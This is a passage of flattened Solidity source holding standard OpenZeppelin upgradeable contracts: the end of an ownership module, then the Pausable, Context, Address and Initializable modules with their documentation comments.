        emit OwnershipTransferred(oldOwner, newOwner);
    }

    /**
     * @dev This empty reserved space is put in place to allow future versions to add new
     * variables without shifting down storage in the inheritance chain.
     * See https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps
     */
    uint256[49] private __gap;
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (security/Pausable.sol)

pragma solidity ^0.8.0;

import "../utils/ContextUpgradeable.sol";
import "../proxy/utils/Initializable.sol";

/**
 * @dev Contract module which allows children to implement an emergency stop
 * mechanism that can be triggered by an authorized account.
 *
 * This module is used through inheritance. It will make available the
 * modifiers `whenNotPaused` and `whenPaused`, which can be applied to
 * the functions of your contract. Note that they will not be pausable by
 * simply including this module, only once the modifiers are put in place.
 */
abstract contract PausableUpgradeable is Initializable, ContextUpgradeable {
    /**
     * @dev Emitted when the pause is triggered by `account`.
     */
    event Paused(address account);

    /**
     * @dev Emitted when the pause is lifted by `account`.
     */
    event Unpaused(address account);

    bool private _paused;

    /**
     * @dev Initializes the contract in unpaused state.
     */
    function __Pausable_init() internal onlyInitializing {
        __Pausable_init_unchained();
    }

    function __Pausable_init_unchained() internal onlyInitializing {
        _paused = false;
    }

    /**
     * @dev Returns true if the contract is paused, and false otherwise.
     */
    function paused() public view virtual returns (bool) {
        return _paused;
    }

    /**
     * @dev Modifier to make a function callable only when the contract is not paused.
     *
     * Requirements:
     *
     * - The contract must not be paused.
     */
    modifier whenNotPaused() {
        require(!paused(), "Pausable: paused");
        _;
    }

    /**
     * @dev Modifier to make a function callable only when the contract is paused.
     *
     * Requirements:
     *
     * - The contract must be paused.
     */
    modifier whenPaused() {
        require(paused(), "Pausable: not paused");
        _;
    }

    /**
     * @dev Triggers stopped state.
     *
     * Requirements:
     *
     * - The contract must not be paused.
     */
    function _pause() internal virtual whenNotPaused {
        _paused = true;
        emit Paused(_msgSender());
    }

    /**
     * @dev Returns to normal state.
     *
     * Requirements:
     *
     * - The contract must be paused.
     */
    function _unpause() internal virtual whenPaused {
        _paused = false;
        emit Unpaused(_msgSender());
    }

    /**
     * @dev This empty reserved space is put in place to allow future versions to add new
     * variables without shifting down storage in the inheritance chain.
     * See https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps
     */
    uint256[49] private __gap;
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;
import "../proxy/utils/Initializable.sol";

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract ContextUpgradeable is Initializable {
    function __Context_init() internal onlyInitializing {
    }

    function __Context_init_unchained() internal onlyInitializing {
    }
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

    /**
     * @dev This empty reserved space is put in place to allow future versions to add new
     * variables without shifting down storage in the inheritance chain.
     * See https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps
     */
    uint256[50] private __gap;
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)

pragma solidity ^0.8.1;

/**
 * @dev Collection of functions related to the address type
 */
library AddressUpgradeable {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     *
     * [IMPORTANT]
     * ====
     * You shouldn't rely on `isContract` to protect against flash loan attacks!
     *
     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
     * constructor.
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize/address.code.length, which returns 0
        // for contracts in construction, since the code is only stored at the end
        // of the constructor execution.

        return account.code.length > 0;
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain `call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
     * revert reason using the provided one.
     *
     * _Available since v4.3._
     */
    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.5.0) (proxy/utils/Initializable.sol)

pragma solidity ^0.8.0;

import "../../utils/AddressUpgradeable.sol";

/**
 * @dev This is a base contract to aid in writing upgradeable contracts, or any kind of contract that will be deployed
 * behind a proxy. Since proxied contracts do not make use of a constructor, it's common to move constructor logic to an
 * external initializer function, usually called `initialize`. It then becomes necessary to protect this initializer
 * function so it can only be called once. The {initializer} modifier provided by this contract will have this effect.
 *
 * TIP: To avoid leaving the proxy in an uninitialized state, the initializer function should be called as early as
 * possible by providing the encoded function call as the `_data` argument to {ERC1967Proxy-constructor}.
 *
 * CAUTION: When used with inheritance, manual care must be taken to not invoke a parent initializer twice, or to ensure
 * that all initializers are idempotent. This is not verified automatically as constructors are by Solidity.
 *
 * [CAUTION]
 * ====
 * Avoid leaving a contract uninitialized.
 *
 * An uninitialized contract can be taken over by an attacker. This applies to both a proxy and its implementation
 * contract, which may impact the proxy. To initialize the implementation contract, you can either invoke the
 * initializer manually, or you can include a constructor to automatically mark it as initialized when it is deployed:
 *
 * [.hljs-theme-light.nopadding]
 * ```
 * /// @custom:oz-upgrades-unsafe-allow constructor
 * constructor() initializer {}
 * ```
 * ====
 */
abstract contract Initializable {
    /**
     * @dev Indicates that the contract has been initialized.
     */
    bool private _initialized;

    /**
     * @dev Indicates that the contract is in the process of being initialized.
     */
    bool private _initializing;

    /**
     * @dev Modifier to protect an initializer function from being invoked twice.
     */
    modifier initializer() {
        // If the contract is initializing we ignore whether _initialized is set in order to support multiple
        // inheritance patterns, but we only do this in the context of a constructor, because in other contexts the
        // contract may have been reentered.
        require(_initializing ? _isConstructor() : !_initialized, "Initializable: contract is already initialized");

        bool isTopLevelCall = !_initializing;
        if (isTopLevelCall) {
            _initializing = true;
            _initialized = true;
        }

        _;

        if (isTopLevelCall) {
            _initializing = false;
        }
    }

    /**
     * @dev Modifier to protect an initialization function so that it can only be invoked by functions with the
     * {initializer} modifier, directly or indirectly.
     */
    modifier onlyInitializing() {
        require(_initializing, "Initializable: contract is not initializing");
        _;
    }

    function _isConstructor() private view returns (bool) {
        return !AddressUpgradeable.isContract(address(this));
    }
}